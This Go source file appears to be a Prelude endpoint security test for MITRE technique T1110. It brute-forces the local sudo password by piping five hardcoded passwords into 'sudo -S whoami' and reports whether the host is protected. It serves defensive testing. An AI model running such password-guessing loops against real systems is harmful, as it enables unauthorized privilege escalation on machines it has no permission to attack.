//go:build !windows
// +build !windows

/*
ID: bc7f082a-91c9-4037-b841-e1d8ceb3101e
NAME: Brute Force
TECHNIQUE: T1110
UNIT: response
CREATED: 2023-12-03 01:09:00.730288
*/
package main

import (
	"fmt"
	"strings"
	"time"

	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

func test() {
	Endpoint.Say("Conducting brute force of sudo password")
	passwords := []string{"qwerty", "Christmas2012", "march2022@", "password123", "five"}
	foundPassword := false

	for _, password := range passwords {
		command := fmt.Sprintf("echo '%s' | sudo -S whoami", password)

		output, err := Endpoint.Shell(strings.Fields(command))
		if err != nil {

			Endpoint.Stop(Endpoint.ExecutionPrevented)
			return
		} else {
			if strings.Contains(output, "root") {
				Endpoint.Say(fmt.Sprintf("Found: sudo => %s", password))
				foundPassword = true
				break
			} else {
				Endpoint.Say(fmt.Sprintf("Tried: %s", password))
			}
		}
		time.Sleep(2 * time.Second)
	}

	if foundPassword {
		Endpoint.Say("Password found!")
		Endpoint.Stop(Endpoint.Unprotected)
	} else {
		Endpoint.Say("Password not found")
		Endpoint.Stop(Endpoint.HostNotVulnerabile)
	}
}

func main() {
	Endpoint.Start(test)
}
